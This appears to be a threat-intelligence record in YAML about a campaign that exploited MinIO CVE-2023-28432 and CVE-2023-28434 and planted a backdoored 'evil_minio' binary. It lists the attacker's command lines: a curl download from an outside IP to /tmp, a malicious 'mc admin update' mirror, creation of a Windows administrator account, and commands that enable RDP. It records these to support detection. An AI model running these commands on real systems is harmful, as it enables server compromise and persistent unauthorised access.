title: 'New Attack Vector In The Cloud: Attackers caught exploiting Object Storage
  Services'
description: A threat actor exploited vulnerable MinIO instances to achieve remote
  code execution, deployed an embedded backdoor via a malicious MinIO binary update,
  and conducted post-compromise activities including system profiling, network reconnaissance,
  and Windows account creation.
attribution: ''
malware_families:
- evil_minio
- EvilMinIO
cves:
- CVE-2023-28432
- CVE-2023-28434
ttps:
  processes:
  - minio
  - curl
  - wget
  - bitsadmin
  - mc
  command_lines:
  - mc alias set [ALIAS] [URL_TARGET_MINIO] [ACCESS_KEY] [SECRET_KEY]
  - mc alias list
  - mc admin update [ALIAS] [MIRROR_URL] --yes
  - curl 5.183.95.88/host/[HOST_ID] -o /tmp/hsh /tmp/h &
  - net user support QWEqwe123!!! /add
  - net localgroup "Remote Desktop Users" support /add
  - net localgroup "Administrators" support /add
  - reg add "HKLM\SYSTEM\CurrentControlSet\Control\Terminal Server" /v fDenyTSConnections
    /t REG_DWORD /d 0 /f
  - netsh advfirewall firewall add rule name="allow RemoteDesktop" dir=in protocol=TCP
    localport=3389 action=allow
  powershell: []
  scripts:
  - adduser.bat
  - winhttpjs.bat
  - node.bat
  - scan.py
  - networks.py
  - pinger.py
  registry_keys:
  - HKLM\SYSTEM\CurrentControlSet\Control\Terminal Server
  image_loads: []
  network_connections:
  - curl -> 5.183.95[.]88:80
  - curl -> 5.183.95[.]88:443
  - curl -> 5[.]183[.]95[.]88:80
  file_activity:
  - /usr/local/bin/minio
  - /tmp/hsh
  - /tmp/h
  - scan_linux
  - networks_linux
  - shell.php
  - adduser.bat
  - winhttpjs.bat
  - node.bat
  - scan.py
  - networks.py
  - pinger.py
  - minio
  - h
  - s
  persistence:
  - Replacement of legitimate MinIO binary at /usr/local/bin/minio with backdoored
    "evil_minio" binary via the MinIO admin update command pointing to attacker-controlled
    MIRROR_URL
  - Windows account creation adding users "support" and "servicemanager" to Remote
    Desktop Users and Administrators groups
  - Registry modification to enable Remote Desktop connections via HKLM\SYSTEM\CurrentControlSet\Control\Terminal
    Server fDenyTSConnections=0
  - Windows Firewall rule added to allow RemoteDesktop on TCP port 3389
  - EvilMinIO embedded backdoor replacing legitimate MinIO binary via malicious update
    process
  - Create local user account "support" and add to Remote Desktop Users and Administrators
    groups
  - Enable RDP via registry key fDenyTSConnections set to 0
  - Allow RDP through firewall via netsh rule on port 3389
  - Web shell (shell.php) deployed on C2 server
  process_relations: []
